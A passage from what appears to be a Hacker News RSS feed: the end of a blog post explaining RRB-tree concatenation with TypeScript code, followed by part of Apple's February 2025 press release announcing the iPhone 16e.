<li>First, we check the invariant <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn><mo>≤</mo><mo stretchy="false">⌈</mo><mn>16</mn><mi mathvariant="normal">/</mi><mn>4</mn><mo stretchy="false">⌉</mo><mo>+</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">7 \le \lceil 16 / 4 \rceil + 2</annotation></semantics></math></span></span>, or <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn><mo>≤</mo><mn>6</mn></mrow><annotation encoding="application/x-tex">7 \le 6</annotation></semantics></math></span></span>, which does not hold - so we need to redistribute some items to reduce the slot count.</li>
<li>We skip slots with 3 items or more (<span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>−</mo><mrow><mi>E</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow></mrow><annotation encoding="application/x-tex">M - {E/2}</annotation></semantics></math></span></span>), which means we skip the first slot (contains 3) but need to distribute the second slot (contains 2).</li>
<li>Slots can contain at most <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span></span> items so we add one item to the third slot and carry the remaining item over to the fourth slot.</li>
<li>This has reduced our total slot count by 1 so we check the invariant to see if we need to continue. If we do, we find the next slot with fewer than <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>−</mo><mi>E</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">M-E/2</annotation></semantics></math></span></span> items and redistribute it; however, since <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>6</mn><mo>≤</mo><mn>6</mn></mrow><annotation encoding="application/x-tex">6 \le 6</annotation></semantics></math></span></span> we are done.</li>
</ol>
<p>We apply our plan to the original set of nodes, producing a new set conforming to our invariant. Nodes that already contain the desired number of items can be reused so we only need to copy items when creating slots that have been redistributed over. Bagwell &amp; Rompf claim this new invariant reduces the concatenation cost by a factor of 3.</p>
<p>Despite the somewhat lengthy explanation, the implementation is fairly simple:</p>
<pre tabindex="0" data-language="typescript"><code><span><span>/**</span></span>
<span><span> * Generate a plan of how the items in `node` should be</span></span>
<span><span> * distributed that conforms to the search step invariant.</span></span>
<span><span> */</span></span>
<span><span>const</span><span> createConcatPlan</span><span> =</span><span> &lt;</span><span>T</span><span>&gt;(</span><span>node</span><span>:</span><span> Branch</span><span>&lt;</span><span>T</span><span>&gt;)</span><span>:</span><span> number</span><span>[] </span><span>=&gt;</span><span> {</span></span>
<span><span>  // our initial plan is the current distribution of items</span></span>
<span><span>  const</span><span> plan</span><span> =</span><span> node.items.</span><span>map</span><span>(</span><span>item</span><span> =&gt;</span><span> item.items.</span><span>length</span><span>)</span></span>
<span><span>  // count the total number of items</span></span>
<span><span>  const</span><span> s</span><span> =</span><span> plan.</span><span>reduce</span><span>((</span><span>a</span><span>, </span><span>b</span><span>) </span><span>=&gt;</span><span> a </span><span>+</span><span> b, </span><span>0</span><span>)</span></span>
<span><span>  // calculate the optimal number of slots necessary</span></span>
<span><span>  const</span><span> opt</span><span> =</span><span> Math.</span><span>ceil</span><span>(s </span><span>/</span><span> M</span><span>)</span></span>
<span></span>
<span><span>  let</span><span> i </span><span>=</span><span> 0</span></span>
<span><span>  let</span><span> n </span><span>=</span><span> plan.</span><span>length</span></span>
<span><span>  // check if our invariant is met</span></span>
<span><span>  while</span><span> (n </span><span>&gt;</span><span> opt </span><span>+</span><span> E_MAX</span><span>) {</span></span>
<span><span>    // skip slots that don't need redistributing</span></span>
<span><span>    while</span><span> (plan[i] </span><span>&gt;=</span><span> M</span><span> -</span><span> E_MAX</span><span> /</span><span> 2</span><span>) i</span><span>++</span></span>
<span></span>
<span><span>    // current slot needs distributing over its subsequent siblings</span></span>
<span></span>
<span><span>    // track remaining items to distribute, which starts as all</span></span>
<span><span>    // the items from the current slot we're going to distribute</span></span>
<span><span>    let</span><span> r </span><span>=</span><span> plan[i]</span></span>
<span><span>    while</span><span> (r </span><span>&gt;</span><span> 0</span><span>) {</span></span>
<span><span>      // replace the items in the current slot with all the items from the next</span></span>
<span><span>      // slot, plus as many remaining items we have to distribute as possible</span></span>
<span><span>      plan[i] </span><span>=</span><span> Math.</span><span>min</span><span>(r </span><span>+</span><span> plan[i </span><span>+</span><span> 1</span><span>], </span><span>M</span><span>)</span></span>
<span><span>      // calculate the items remaining</span></span>
<span><span>      r </span><span>=</span><span> r </span><span>+</span><span> plan[i </span><span>+</span><span> 1</span><span>] </span><span>-</span><span> plan[i]</span></span>
<span><span>      i </span><span>+=</span><span> 1</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    // slots that were distributed over were shuffled one slot to the left so</span></span>
<span><span>    // we need to do the same for any remaining slots</span></span>
<span><span>    for</span><span> (</span><span>let</span><span> j </span><span>=</span><span> i; j </span><span>&lt;</span><span> n </span><span>-</span><span> 1</span><span>; j</span><span>++</span><span>) {</span></span>
<span><span>      plan[j] </span><span>=</span><span> plan[j </span><span>+</span><span> 1</span><span>]</span></span>
<span><span>    }</span></span>
<span></span>
<span><span>    // account for shuffling slots to the left</span></span>
<span><span>    i</span><span>--</span></span>
<span><span>    n</span><span>--</span></span>
<span><span>  }</span></span>
<span></span>
<span><span>  return</span><span> plan.</span><span>slice</span><span>(</span><span>0</span><span>, n)</span></span>
<span><span>}</span></span>
<span></span></code></pre>
<h2 id="merging">Merging</h2>
<p>Finally, let’s merge some trees!</p>
<img src="https://peter.horne-khan.com/_astro/figure-6.D-xXlWtY_Vbb2.svg" alt="Merging 2 RRB Trees - Part #1" width="1141" height="152" loading="lazy" decoding="async">
<p>To reduce clutter, I won’t include the size tables in the subsequent diagrams but in the example implementation we create them as necessary when new nodes are created.</p>
<p>We start by walking down the left tree until we reach the slot pointing to the rightmost leaf node, and the right tree until we reach the slot pointing to the leftmost leaf node. We take these two slots and create a new node from them, thus leaving us with 3 nodes: the original left node minus its last slot, the newly created ‘middle’ node, and the original right node minus its first slot.</p>
<img src="https://peter.horne-khan.com/_astro/figure-7.eEursljJ_1SrHNv.svg" alt="Merging 2 RRB Trees - Part #2" width="1091" height="161" loading="lazy" decoding="async">
<p>We consider the slots of all 3 nodes together and rebalance as necessary, placing the result in a new parent node that will be carried up to the next level and merged in a recursive fashion. Presently, the search step invariant is not met so we redistribute the second slot (which is the first with fewer than <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>−</mo><mi>E</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">M - E/2</annotation></semantics></math></span></span> items) over its subsequent siblings, which is sufficient to rebalance the slots. We then create a parent node along with sufficient children to optimally contain the rebalanced slots. All newly created nodes are indicated in orange so you can see that the merging process is able to reuse a lot of the existing nodes, reducing the amount of work that needs to be done.</p>
<img src="https://peter.horne-khan.com/_astro/figure-8.CX0-kYdd_Z2bn0Ay.svg" alt="Merging 2 RRB Trees - Part #3" width="1091" height="161" loading="lazy" decoding="async">
<p>Since the parent node we created is 1 level higher than the nodes we merged, we move up a level an merge it with the other nodes at that level. Much like before, we drop the rightmost slot from the left node, and the rightmost slot from the left node, since those subtrees are already contained in our ‘middle’ node and then consider the slots of all 3 nodes together for rebalancing. This time we have 12 items distributed over 4 slots so the invariant is already met and all we need to do is create a new node to hold them.</p>
<img src="https://peter.horne-khan.com/_astro/figure-9.cmBocD6d_XkTJG.svg" alt="Merging 2 RRB Trees - Part #4" width="1091" height="211" loading="lazy" decoding="async">
<p>This time the new parent node has no siblings to merge with since we’ve reached the top of the tree. As the parent node only contains a single slot the rebalancing process has introduced a redundant level which we simply chop off.</p>
<p>And that’s it! We’ve successfully merged both trees together, ensuring the search step invariant is maintained, while reusing most of the existing nodes.</p>
<p>The implementation is fairly lengthy but there’s nothing especially complex going on:</p>
<pre tabindex="0" data-language="typescript"><code><span><span>/**</span></span>
<span><span> * Concatenate two RRB trees into a single balanced RRB tree.</span></span>
<span><span> */</span></span>
<span><span>export</span><span> const</span><span> concat</span><span> =</span><span> &lt;</span><span>T</span><span>&gt;(</span><span>left</span><span>:</span><span> Rrb</span><span>&lt;</span><span>T</span><span>&gt;, </span><span>right</span><span>:</span><span> Rrb</span><span>&lt;</span><span>T</span><span>&gt;)</span><span>:</span><span> Rrb</span><span>&lt;</span><span>T</span><span>&gt; </span><span>=&gt;</span><span> {</span></span>
<span><span>  // create a single, balanced node containing all items from left and right</span></span>
<span><span>  const</span><span> merged</span><span> =</span><span> concatNodes</span><span>(left.root, right.root)</span></span>
<span><span>  return</span><span> {</span></span>
<span><span>    count: left.count </span><span>+</span><span> right.count,</span></span>
<span><span>    root:</span></span>
<span><span>      // there may be a redundant extra level so we chop it off if necessary</span></span>
<span><span>      merged.items.</span><span>length</span><span> ===</span><span> 1</span><span> ?</span><span> merged.items[</span><span>0</span><span>] </span><span>:</span><span> merged,</span></span>
<span><span>  }</span></span>
<span><span>}</span></span>
<span></span>
<span><span>/**</span></span>
<span><span> * Concatenate two nodes into a single balanced branch.</span></span>
<span><span> *</span></span>
<span><span> * Since we always return a branch, but there may be M or fewer items, the</span></span>
<span><span> * branch may be redundant and can be unwrapped by the caller.</span></span>
<span><span> */</span></span>
<span><span>const</span><span> concatNodes</span><span> =</span><span> &lt;</span><span>T</span><span>&gt;(</span></span>
<span><span>  left</span><span>:</span><span> Node</span><span>&lt;</span><span>T</span><span>&gt;,</span></span>
<span><span>  right</span><span>:</span><span> Node</span><span>&lt;</span><span>T</span><span>&gt;,</span></span>
<span><span>  top</span><span>:</span><span> boolean</span><span> =</span><span> true</span></span>
<span><span>)</span><span>:</span><span> Branch</span><span>&lt;</span><span>T</span><span>&gt; </span><span>=&gt;</span><span> {</span></span>
<span><span>  // first, we handle trees of different heights</span></span>
<span></span>
<span><span>  if</span><span> (left.height </span><span>&gt;</span><span> right.height) {</span></span>
<span><span>    assert</span><span>(</span><span>isBranch</span><span>(left))</span></span>
<span><span>    const</span><span> middle</span><span> =</span><span> concatNodes</span><span>(array.</span><span>last</span><span>(left.items), right, </span><span>false</span><span>)</span></span>
<span><span>    return</span><span> rebalance</span><span>(left, middle, </span><span>null</span><span>, top)</span></span>
<span><span>  }</span></span>
<span></span>
<span><span>  if</span><span> (left.height </span><span>&lt;</span><span> right.height) {</span></span>
<span><span>    assert</span><span>(</span><span>isBranch</span><span>(right))</span></span>
<span><span>    const</span><span> middle</span><span> =</span><span> concatNodes</span><span>(left, array.</span><span>first</span><span>(right.items), </span><span>false</span><span>)</span></span>
<span><span>    return</span><span> rebalance</span><span>(</span><span>null</span><span>, middle, right, top)</span></span>
<span><span>  }</span></span>
<span></span>
<span><span>  // then, we handle leaf nodes</span></span>
<span></span>
<span><span>  if</span><span> (</span><span>isLeaf</span><span>(left) </span><span>&amp;&amp;</span><span> isLeaf</span><span>(right)) {</span></span>
<span><span>    const</span><span> total</span><span> =</span><span> left.items.</span><span>length</span><span> +</span><span> right.items.</span><span>length</span></span>
<span><span>    if</span><span> (top </span><span>&amp;&amp;</span><span> total </span><span>&lt;=</span><span> M</span><span>) {</span></span>
<span><span>      return</span><span> Branch</span><span>(</span><span>1</span><span>, [</span><span>Leaf</span><span>([</span><span>...</span><span>left.items, </span><span>...</span><span>right.items])])</span></span>
<span><span>    } </span><span>else</span><span> {</span></span>
<span><span>      // this may not be balanced but the outer</span></span>
<span><span>      // recursive step will rebalance it later</span></span>
<span><span>      return</span><span> Branch</span><span>(</span><span>1</span><span>, [left, right])</span></span>
<span><span>    }</span></span>
<span><span>  }</span></span>
<span></span>
<span><span>  // finally, we handle branches of equal height</span></span>
<span></span>
<span><span>  if</span><span> (</span><span>isBranch</span><span>(left) </span><span>&amp;&amp;</span><span> isBranch</span><span>(right)) {</span></span>
<span><span>    const</span><span> middle</span><span> =</span><span> concatNodes</span><span>(</span></span>
<span><span>      array.</span><span>last</span><span>(left.items),</span></span>
<span><span>      array.</span><span>first</span><span>(right.items),</span></span>
<span><span>      false</span></span>
<span><span>    )</span></span>
<span><span>    return</span><span> rebalance</span><span>(left, middle, right, top)</span></span>
<span><span>  }</span></span>
<span></span>
<span><span>  throw</span><span> Error</span><span>(</span><span>"unreachable"</span><span>)</span></span>
<span><span>}</span></span>
<span></span>
<span><span>const</span><span> calcSizes</span><span> =</span><span> &lt;</span><span>T</span><span>&gt;(</span><span>items</span><span>:</span><span> Node</span><span>&lt;</span><span>T</span><span>&gt;[])</span><span>:</span><span> number</span><span>[] </span><span>=&gt;</span><span> {</span></span>
<span><span>  let</span><span> prev </span><span>=</span><span> 0</span></span>
<span><span>  return</span><span> items.</span><span>map</span><span>(</span><span>item</span><span> =&gt;</span><span> (prev </span><span>+=</span><span> sizeOf</span><span>(item)))</span></span>
<span><span>}</span></span>
<span></span>
<span><span>/**</span></span>
<span><span> * Create a single, balanced branch containing</span></span>
<span><span> * all items from the input branches.</span></span>
<span><span> */</span></span>
<span><span>const</span><span> rebalance</span><span> =</span><span> &lt;</span><span>T</span><span>&gt;(</span></span>
<span><span>  left</span><span>:</span><span> Branch</span><span>&lt;</span><span>T</span><span>&gt; </span><span>|</span><span> null</span><span>,</span></span>
<span><span>  middle</span><span>:</span><span> Branch</span><span>&lt;</span><span>T</span><span>&gt;,</span></span>
<span><span>  right</span><span>:</span><span> Branch</span><span>&lt;</span><span>T</span><span>&gt; </span><span>|</span><span> null</span><span>,</span></span>
<span><span>  top</span><span>:</span><span> boolean</span></span>
<span><span>)</span><span>:</span><span> Branch</span><span>&lt;</span><span>T</span><span>&gt; </span><span>=&gt;</span><span> {</span></span>
<span><span>  // merge into a single, unbalanced node that may contain up to 2M items</span></span>
<span><span>  const</span><span> merged</span><span> =</span><span> Branch</span><span>(middle.height, [</span></span>
<span><span>    ...</span><span>(left </span><span>?</span><span> array.</span><span>init</span><span>(left.items) </span><span>:</span><span> []),</span></span>
<span><span>    ...</span><span>middle.items,</span></span>
<span><span>    ...</span><span>(right </span><span>?</span><span> array.</span><span>tail</span><span>(right.items) </span><span>:</span><span> []),</span></span>
<span><span>  ])</span></span>
<span><span>  // create a plan of how the items should be balanced</span></span>
<span><span>  const</span><span> plan</span><span> =</span><span> createConcatPlan</span><span>(merged)</span></span>
<span><span>  // create a single, balanced node that may contain up to 2M items</span></span>
<span><span>  const</span><span> balanced</span><span> =</span><span> executeConcatPlan</span><span>(merged, plan)</span></span>
<span></span>
<span><span>  if</span><span> (plan.</span><span>length</span><span> &lt;=</span><span> M</span><span>) {</span></span>
<span><span>    return</span><span> top </span><span>?</span><span> balanced </span><span>:</span><span> Branch</span><span>(balanced.height </span><span>+</span><span> 1</span><span>, [balanced])</span></span>
<span><span>  } </span><span>else</span><span> {</span></span>
<span><span>    // distribute the (up to 2M) items across 2 nodes in a new branch</span></span>
<span><span>    const</span><span> left</span><span> =</span><span> Branch</span><span>(balanced.height, balanced.items.</span><span>slice</span><span>(</span><span>0</span><span>, </span><span>M</span><span>))</span></span>
<span><span>    const</span><span> right</span><span> =</span><span> Branch</span><span>(balanced.height, balanced.items.</span><span>slice</span><span>(</span><span>M</span><span>))</span></span>
<span><span>    return</span><span> Branch</span><span>(balanced.height </span><span>+</span><span> 1</span><span>, [left, right])</span></span>
<span><span>  }</span></span>
<span><span>}</span></span>
<span></span>
<span><span>/*</span></span>
<span><span> * Distribute the items in `node` according to `plan`. Both the input and</span></span>
<span><span> * output may have more than M items which will be handled in `rebalance`.</span></span>
<span><span> */</span></span>
<span><span>const</span><span> executeConcatPlan</span><span> =</span><span> &lt;</span><span>T</span><span>&gt;(</span><span>node</span><span>:</span><span> Branch</span><span>&lt;</span><span>T</span><span>&gt;, </span><span>plan</span><span>:</span><span> number</span><span>[])</span><span>:</span><span> Branch</span><span>&lt;</span><span>T</span><span>&gt; </span><span>=&gt;</span><span> {</span></span>
<span><span>  const</span><span> items</span><span>:</span><span> Node</span><span>&lt;</span><span>T</span><span>&gt;[] </span><span>=</span><span> []</span></span>
<span></span>
<span><span>  let</span><span> i </span><span>=</span><span> 0</span></span>
<span><span>  let</span><span> offset </span><span>=</span><span> 0</span></span>
<span><span>  plan.</span><span>forEach</span><span>(</span><span>target</span><span> =&gt;</span><span> {</span></span>
<span><span>    if</span><span> (offset </span><span>===</span><span> 0</span><span> &amp;&amp;</span><span> node.items[i].items.</span><span>length</span><span> ===</span><span> target) {</span></span>
<span><span>      items.</span><span>push</span><span>(node.items[i])</span></span>
<span><span>      i </span><span>+=</span><span> 1</span></span>
<span><span>    } </span><span>else</span><span> {</span></span>
<span><span>      const</span><span> current</span><span>:</span><span> Node</span><span>&lt;</span><span>T</span><span>&gt;[] </span><span>|</span><span> T</span><span>[] </span><span>=</span><span> []</span></span>
<span><span>      while</span><span> (current.</span><span>length</span><span> &lt;</span><span> target) {</span></span>
<span><span>        const</span><span> required</span><span> =</span><span> target </span><span>-</span><span> current.</span><span>length</span></span>
<span><span>        const</span><span> size</span><span> =</span><span> node.items[i].items.</span><span>length</span></span>
<span><span>        const</span><span> available</span><span> =</span><span> size </span><span>-</span><span> offset</span></span>
<span><span>        const</span><span> min</span><span> =</span><span> Math.</span><span>min</span><span>(required, available)</span></span>
<span><span>        current.</span><span>push</span><span>(</span></span>
<span><span>          ...</span><span>(node.items[i].items.</span><span>slice</span><span>(offset, min </span><span>+</span><span> offset) </span><span>as</span><span> any</span><span>)</span></span>
<span><span>        )</span></span>
<span><span>        if</span><span> (min </span><span>===</span><span> available) {</span></span>
<span><span>          offset </span><span>=</span><span> 0</span></span>
<span><span>          i </span><span>+=</span><span> 1</span></span>
<span><span>        } </span><span>else</span><span> {</span></span>
<span><span>          offset </span><span>+=</span><span> min</span></span>
<span><span>        }</span></span>
<span><span>      }</span></span>
<span><span>      items.</span><span>push</span><span>(</span><span>Node</span><span>(node.height </span><span>-</span><span> 1</span><span>, current))</span></span>
<span><span>    }</span></span>
<span><span>  })</span></span>
<span></span>
<span><span>  return</span><span> Branch</span><span>(node.height, items)</span></span>
<span><span>}</span></span>
<span></span></code></pre>
<p>The example implementation can be found in full at <a href="https://github.com/peterhorne/rrb-tree">https://github.com/peterhorne/rrb-tree</a>.</p>  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Apple Debuts iPhone 16e (334 pts)]]></title>
            <link>https://www.apple.com/newsroom/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/</link>
            <guid>43103536</guid>
            <pubDate>Wed, 19 Feb 2025 16:00:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.apple.com/newsroom/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/">https://www.apple.com/newsroom/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/</a>, See on <a href="https://news.ycombinator.com/item?id=43103536">Hacker News</a></p>
<div id="readability-page-1" class="page">


	
    







 
<nav id="ac-localnav" lang="en-US" role="navigation" aria-label="Newsroom" data-analytics-region="local nav" data-sticky="">
	
    
    
        




    
    
    
	
	

</nav>





<main id="main" role="main"> 




<span id="opens-in-new-window">opens in new window</span>
<section>
<article data-analytics-activitymap-region-id="article">






    
    
    









    





    <div>
        
		
        <div>
                    
                    
                        <span>PRESS RELEASE</span>
                    
                    
                        <span>February 19, 2025</span>
                    
                    
                </div>

        <div>
                
                
                
                    <h2>
                        
    
        Apple debuts iPhone&nbsp;16e: A&nbsp;powerful new member of the iPhone&nbsp;16 family
    

                    </h2>
                
            </div>

        <div>
                
                
                    iPhone 16e joins the iPhone 16 lineup, featuring the fast performance of the A18 chip, Apple Intelligence, extraordinary battery life, and a 48MP 2-in-1 camera system — all at an incredible value
                
            </div>

        
            
    
    
    
    
    

        

    </div>







    
    
    


    
        
        
        
        
            <figure aria-label="Media, Two white iPhone 16e devices shown back to back.">
                <div>
                         
                            
                            <div>
                                Introducing iPhone 16e, the most affordable member of the iPhone 16 family.
                            </div>
                        
                        
                        
                        
                        <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-hero-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-hero-250219_inline" aria-label="Download media, Two white iPhone 16e devices shown back to back."></a>
                    </div>
            </figure>
        
    










    
    
    


     
     
    
    
        <div>
             
                 <div><strong><span>CUPERTINO, CALIFORNIA</span>&nbsp;</strong>Apple today announced <a href="https://www.youtube.com/watch?v=mFuyX1XgJFg" target="_blank" rel="nofollow" data-analytics-exit-link="">iPhone 16e</a>, a new addition to the iPhone 16 lineup that offers powerful capabilities at a more affordable price. iPhone 16e delivers fast, smooth performance and breakthrough battery life, thanks to the industry-leading efficiency of the A18 chip and the new Apple C1, the first cellular modem designed by Apple. iPhone 16e is also built for Apple Intelligence, the intuitive personal intelligence system that delivers helpful and relevant intelligence while taking an extraordinary step forward for privacy in AI. The 48MP Fusion camera takes gorgeous photos and videos, and with an integrated 2x Telephoto, it is like having two cameras in one, so users can zoom in with optical quality. When outside of cellular and Wi-Fi coverage, Apple’s groundbreaking satellite features — including Emergency SOS, Roadside Assistance, Messages, and Find My via satellite — help iPhone 16e users stay connected and get assistance when it matters most.<sup>1</sup>
</div>
                 
             
                 <div>iPhone 16e will be available in two elegant matte finishes — black and white — with colorful cases available to accessorize. Pre-orders begin Friday, February 21, with availability beginning Friday, February 28.
</div>
                 
             
                 <div>“iPhone 16e packs in the features our users love about the iPhone 16 lineup, including breakthrough battery life, fast performance powered by the latest-generation A18 chip, an innovative 2-in-1 camera system, and Apple Intelligence,” said Kaiann Drance, Apple’s vice president of Worldwide iPhone Product Marketing. “We’re so excited for iPhone 16e to complete the lineup as a powerful, more affordable option to bring the iPhone experience to even more people.”
</div>
                 
             
         </div>
 

    
    
    






  
    
    
    
    
      <figure aria-label="Media, Two white iPhone 16 devices stacked on top of each other.">
        <div>
             
              
              <div>
                Available in a popular 6.1-inch display size, iPhone 16e features breakthrough battery life, fast performance, a 48MP 2-in-1 camera system, and a beautiful, durable design.
              </div>
            
            
            
            
            <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-2-up-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-2-up-250219_big" aria-label="Download media, Two white iPhone 16 devices stacked on top of each other."></a>
          </div>
      </figure>
    
  






    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>A Beautiful and Durable Design with Breakthrough Battery&nbsp;Life</strong>
</h2>
                 
             
                 <div>iPhone 16e is built to last, featuring splash, water, and dust resistance with a rating of IP68; the Ceramic Shield front cover with an advanced formulation that is tougher than any smartphone glass; and the toughest back glass in a smartphone.<sup>2</sup> The 6.1-inch Super Retina XDR display with OLED technology has an edge-to-edge design that is perfect for watching HDR videos, playing games, and reading crisp text.<sup>3</sup> iPhone 16e has the best battery life ever on a 6.1-inch iPhone, lasting up to six hours longer than iPhone 11 and up to 12 hours longer than all generations of iPhone SE.<sup>4</sup> And with Face ID enabled by the TrueDepth camera system, users can securely unlock their iPhone, authenticate purchases, sign in to apps, and more. iPhone 16e also offers convenient charging options, including both wireless charging and USB-C for easy connection to a wide range of accessories.
</div>
                 
             
         </div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="iphone-16e-design">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-8317016814f7a95251202a1645ce5d74" href="#gallery-8317016814f7a95251202a1645ce5d74" data-ac-gallery-trigger="gallery-8317016814f7a95251202a1645ce5d74"><span>A matte white and a matte black iPhone 16e, side by side. </span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-cf158fb53b54c12e21819131135900b0" href="#gallery-cf158fb53b54c12e21819131135900b0" data-ac-gallery-trigger="gallery-cf158fb53b54c12e21819131135900b0"><span>The 6.1-inch display and back camera on iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-90a221678acd651f124b4116ad4993ee" href="#gallery-90a221678acd651f124b4116ad4993ee" data-ac-gallery-trigger="gallery-90a221678acd651f124b4116ad4993ee"><span>A close-up of the USB-C port on iPhone 16e.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-8317016814f7a95251202a1645ce5d74" aria-labelledby="gallery-dotnav-8317016814f7a95251202a1645ce5d74" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:colors">
                                
                                <div>
                                    <div>iPhone 16e is available in elegant matte white and black finishes with a splash-, water-, and dust-resistant design.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-color-lineup-back-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-color-lineup-back-250219_inline" aria-label="Download media, A matte white and a matte black iPhone 16e, side by side. "></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-cf158fb53b54c12e21819131135900b0" aria-labelledby="gallery-dotnav-cf158fb53b54c12e21819131135900b0" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:camera-and-display">
                                
                                <div>
                                    <div>iPhone 16e features the toughest back glass in a smartphone, and the brilliant 6.1-inch display is protected by the Ceramic Shield, which is tougher than any smartphone glass.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-front-and-back-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-front-and-back-250219_inline" aria-label="Download media, The 6.1-inch display and back camera on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-90a221678acd651f124b4116ad4993ee" aria-labelledby="gallery-dotnav-90a221678acd651f124b4116ad4993ee" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:usb-c">
                                
                                <div>
                                    <div>iPhone 16e features USB-C, so the same cable can charge iPhone, Mac, iPad, AirPods, and other devices.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-USB-C-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-USB-C-250219_inline" aria-label="Download media, A close-up of the USB-C port on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>Performance and Connectivity</strong>
</h2>
                 
             
                 <div>iPhone 16e is powered by Apple’s latest-generation A18 chip, which enables fast, smooth performance, incredible power efficiency, and Apple Intelligence. The 6-core CPU is up to 80 percent faster than the A13 Bionic chip on iPhone 11, handling both everyday and intensive tasks with ease — from simple workloads, to more demanding actions with Apple Intelligence. The 4-core GPU powers stunning graphics performance and unlocks next-level mobile gaming on the go, enabling graphically demanding AAA titles and hardware-accelerated ray tracing for more realistic lighting and reflections. The 16-core Neural Engine is optimized for large generative models and runs machine learning (ML) models up to 6x faster than A13 Bionic.
</div>
                 
             
         </div>
 

    
    
    


    
    <div data-component-list="ScrollAnimationDefault AutoPlayVideo">
        <div>The A18 chip enables fast, smooth performance and stunning graphics for next-level mobile gaming in titles like Infinity Nikki.</div>
        
            <a aria-label="Download video: Infinity Nikki on iPhone 16e" data-analytics-title="Download video - Infinity Nikki on iPhone 16e" download="" href="https://www.apple.com/newsroom/videos/2025/autoplay/02/apple-iphone-16e-gaming-infinity-nikki-250219/downloads/Apple-iPhone-16e-gaming-Infinity-Nikki-250219.zip">
            </a>
        
    </div>






    
    
    


     
     
    
    
        <div>
             
                 <div>Expanding the benefits of Apple silicon, C1 is the first modem designed by Apple and the most power-efficient modem ever on an iPhone, delivering fast and reliable 5G cellular connectivity. Apple silicon — including C1 — the all-new internal design, and the advanced power management of iOS 18 all contribute to extraordinary battery life.
</div>
                 
             
                 <h2><strong>Built for Apple Intelligence</strong>
</h2>
                 
             
                 <div>iPhone 16e is built for Apple Intelligence, unlocking exciting new capabilities that make iPhone even more helpful and powerful. With the Clean Up tool, it’s easy to remove distracting elements in images, and natural language search in the Photos app allows users to search for just about any photo or video by simply describing what they are looking for.
</div>
                 
             
         </div>
 

    
    
    


    
    <div data-component-list="ScrollAnimationDefault AutoPlayVideo">
        <div>Clean Up in Photos, powered by Apple Intelligence, allows users to remove distractions from an image.</div>
        
            <a aria-label="Download video: Clean Up on iPhone 16e" data-analytics-title="Download video - Clean Up on iPhone 16e" download="" href="https://www.apple.com/newsroom/videos/2025/autoplay/02/apple-iphone-16e-apple-intelligence-clean-up-250219/downloads/Apple-iPhone-16e-Apple-Intelligence-Clean-Up-250219.zip">
            </a>
        
    </div>






    
    
    


     
     
    
    
        <div>Users can also explore creative new ways to express themselves visually with Image Playground, create the perfect emoji with Genmoji, and make their writing even more dynamic with Writing Tools. They can now type to Siri, and Siri is more conversational with the ability to follow along if users stumble over their words. Siri can also maintain context from one request to the next. With extensive product knowledge, Siri can answer thousands of questions about the features and settings of Apple products, so users can learn how to do things like take a screen recording or schedule a text message to send later.
</div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="iphone-16e-apple-intelligence-features">
            <nav role="presentation">
